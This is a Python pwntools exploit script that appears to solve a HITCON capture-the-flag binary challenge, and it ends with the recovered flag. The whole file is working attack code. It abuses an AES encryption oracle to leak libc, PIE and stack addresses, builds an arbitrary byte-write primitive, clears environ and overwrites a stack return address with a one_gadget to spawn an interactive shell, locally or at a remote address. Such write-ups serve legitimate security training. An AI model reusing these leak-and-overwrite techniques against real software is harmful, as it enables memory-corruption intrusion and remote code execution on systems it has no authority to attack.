#!/usr/bin/env python3

from Crypto.Cipher import AES
import pwn


DEBUG = True

if DEBUG:
    p = pwn.process("./chall")
else:
    p = pwn.remote("3.113.219.89", 31337)
pwn.context.log_level = "debug"
pwn.context.terminal = ["tmux", "splitw", "-h"]


def enc(offset):
    p.recvuntil("offset:")
    p.sendline(str(offset))
    p.recvuntil("size:")
    p.sendline(str(15))
    return p.recvn(16)


def findPath(char, val, key):
    key_list = [key]
    aes_list = [AES.new(key, AES.MODE_ECB)]
    for i in range(15):
        key_list.append(aes_list[-1].encrypt(key_list[-1]))
        aes_list.append(AES.new(key_list[-1], AES.MODE_ECB))

    curr_list = [(val, 0, "")]
    for i in range(15):
        new_list = []
        for val, key, path in curr_list:
            if val[0] == char:
                return path, key_list[key], aes_list[key]
            new_list.append((aes_list[key].encrypt(val), key, path + "0"))
            new_list.append((val, key + 1, path + "1"))
        curr_list = new_list
    assert False


def write(addr, char, key):
    assert 0 <= char < 255
    new_val = enc(addr - gbuf)
    path, key, aes = findPath(char, new_val, key)
    print(path)
    for i in path:
        if i == "0":
            new_val = enc(addr - gbuf)
        elif i == "1":
            new_val = enc(key_addr - gbuf)
    assert new_val[0] == char
    return key, aes


dso_handle = 0x202008
stderr = 0x202360
key_addr = 0x202380
gbuf = 0x2023A0
one_gadget = 0x4F2C5
environ = 0x3EE098

AESKey = enc(key_addr - gbuf)
aes = AES.new(AESKey, AES.MODE_ECB)

enc_libc = enc(stderr - gbuf)
libc = pwn.u64(aes.decrypt(enc_libc)[:8]) - 0x3ec680

pwn.log.success("LIBC BASE: 0x{:012x}".format(libc))

enc_pie = enc(dso_handle - gbuf)
pie = pwn.u64(aes.decrypt(enc_pie)[:8]) - dso_handle

pwn.log.success("PIE BASE: 0x{:012x}".format(pie))

key_addr += pie
gbuf += pie
one_gadget += libc
environ += libc

enc_stack = enc(environ - gbuf)
stack = pwn.u64(aes.decrypt(enc_stack)[:8])

pwn.log.success("STACK LEAK: 0x{:012x}".format(stack))

enc(stack - 0x128 - gbuf)       # Set i to negative value

for i, ch in enumerate(pwn.p64(0)):
    AESKey, aes = write(environ + i, ch, AESKey)

payload = pwn.p64(one_gadget)

for i, ch in enumerate(payload):            # Write ROP chain in stack
    AESKey, aes = write(stack - 0xF0 + i, ch, AESKey)

while True:
    new_stack = enc(stack - 0x128 - gbuf)   # Set i to positive value
    if new_stack[11] & 0x80 == 0:
        break

pwn.context.log_level = "info"
p.interactive()

# hitcon{is_tH15_A_crypTO_cha11eng3_too00oo0oo???}